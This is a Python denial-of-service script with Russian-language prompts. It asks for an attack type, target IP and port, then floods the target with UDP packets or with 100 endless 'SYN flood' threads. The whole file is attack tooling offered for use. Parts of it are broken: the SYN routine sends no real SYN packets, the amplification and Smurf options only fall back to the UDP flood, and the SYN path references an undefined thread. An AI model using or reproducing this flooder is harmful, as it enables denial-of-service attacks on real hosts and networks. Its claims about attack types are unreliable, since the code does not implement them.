import socket
import threading
import time

rodzaj_ddos = {
    "UDP flood",
    "SYN flood",
    "DNS Amplification",
    "Smurf-атака"
}

def syn_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.sendto(b"SYN", (target_ip, target_port))
        except socket.error as e:
            print(f"Ошибка при отправке пакета: {e}")
        finally:
            s.close()

def send_packets(target_ip, target_port, packet_count, stop_event, attack_type):
    message = b"High load test packet"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packets_sent = 0
    start_time = time.time()

    try:
        while not stop_event.is_set():
            sock.sendto(message, (target_ip, target_port))
            packets_sent += 1
            if packet_count and packets_sent >= packet_count:
                break
            
            # Обновляем строку каждые 1000 пакетов
            if packets_sent % 1000 == 0:
                elapsed_time = time.time() - start_time
                if elapsed_time > 0:
                    # Выводим данные в одной строке
                    print(f"\r{attack_type}: Отправлено: {packets_sent}, Скорость: {packets_sent / elapsed_time:.2f} пакетов/сек, Время: {elapsed_time:.2f} секунд", end="", flush=True)
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()
        elapsed_time = time.time() - start_time
        if elapsed_time > 1:
            print(f"\n{attack_type}: Тест завершен. Отправлено: {packets_sent}, Средняя скорость: {packets_sent / elapsed_time:.2f} пакетов/сек, Общее время: {elapsed_time:.2f} секунд")

if __name__ == "__main__":
    attack_type = input(f"Выберите тип атаки из {', '.join(rodzaj_ddos)}: ")
    if attack_type not in rodzaj_ddos:
        print("Неверный тип атаки.")
        exit()

    packet_count = input("Введите количество пакетов для отправки (оставьте пустым для бесконечной отправки): ")
    packet_count = int(packet_count) if packet_count else None
    ip = input("Введите IP для атаки: ")
    port = input("Введите порт для атаки: ")
    target_ip = ip
    target_port = int(port)

    stop_event = threading.Event()

    try:
        if attack_type == "SYN flood":
            for _ in range(100):  # Определяем количество потоков для SYN flood
                thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
                thread.start()
        else:
            send_thread = threading.Thread(target=send_packets, args=(target_ip, target_port, packet_count, stop_event, attack_type))
            send_thread.start()

        input("Нажмите Enter для остановки теста\n")
    finally:
        stop_event.set()
        send_thread.join()
